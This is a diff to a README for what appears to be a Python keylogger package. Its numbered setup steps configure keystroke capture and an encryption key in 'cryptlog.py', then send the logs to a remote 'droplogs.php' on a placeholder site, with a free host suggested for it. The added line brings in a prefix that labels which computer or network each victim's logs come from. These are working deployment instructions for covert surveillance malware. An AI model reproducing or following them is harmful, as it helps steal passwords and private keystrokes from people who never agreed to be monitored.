@@ -6,6 +6,7 @@ Here's what you need to do to start logging keystrokes:
 2.) Edit the "cryptlog.py" file.
    a.) replace "thisiswhereyourkeygoes" with whatever key you want to encrypt the data with.
    b.) Change "http://www.yoursite.com/droplogs.php" to whatever your site is. (Need a good freehost?  Check out x10 hosting. "http://www.x10hosting.com/")
+   c.) change the variable "prefix" to the prefix you want, allowing you to specify what computer or network it was on.
 3.) Edit the "viewlogs.py" file.
    a.) Change "http://www.yoursite.com/" to the name of your site.
 4.) Edit the "droplogs.php" file.
